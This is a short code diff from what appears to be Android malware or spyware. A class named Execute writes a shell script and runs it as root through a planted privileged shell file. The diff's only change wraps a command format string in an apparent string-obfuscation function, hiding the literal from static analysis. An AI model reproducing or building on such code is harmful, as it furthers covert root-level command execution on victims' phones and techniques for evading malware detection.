@@ -250,7 +250,7 @@ public class Execute {
 		String pack = Status.self().getAppContext().getPackageName();
 
 		String script = M.e("#!/system/bin/sh") + "\n" + cmd;
-		String filename = String.format("%s qzx /data/data/%s/files/e", Configuration.shellFile, pack);
+		String filename = String.format(M.e("%s qzx /data/data/%s/files/e"), Configuration.shellFile, pack);
 
 		if (Root.createScript("e", script) == true) {
 			try {
